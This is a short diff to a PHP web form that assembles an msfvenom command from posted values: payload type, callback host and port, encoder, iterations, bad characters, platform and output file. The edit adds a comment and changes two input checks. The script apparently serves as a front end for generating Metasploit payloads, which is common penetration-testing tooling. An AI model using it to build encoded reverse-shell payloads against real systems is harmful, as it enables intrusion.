@@ -1,5 +1,6 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    // Sanitize and validate inputs
     $payload_type = escapeshellarg($_POST['payload-type']);
     $lhost = escapeshellarg($_POST['lhost']);
     $lport = escapeshellarg($_POST['lport']);
@@ -23,13 +24,13 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 
     // Construct msfvenom command
     $command = "msfvenom -p $payload_type LHOST=$lhost LPORT=$lport ";
-    if (!empty($encoder)) {
+    if (!empty($_POST['encoder'])) {
         $command .= "-e $encoder ";
     }
     if ($iterations > 0) {
         $command .= "-i $iterations ";
     }
-    if (!empty($bad_chars)) {
+    if (!empty($_POST['bad-chars'])) {
         $command .= "-b $bad_chars ";
     }
     $command .= "-a $architecture --platform $platform -f $output_format -o $output_file";
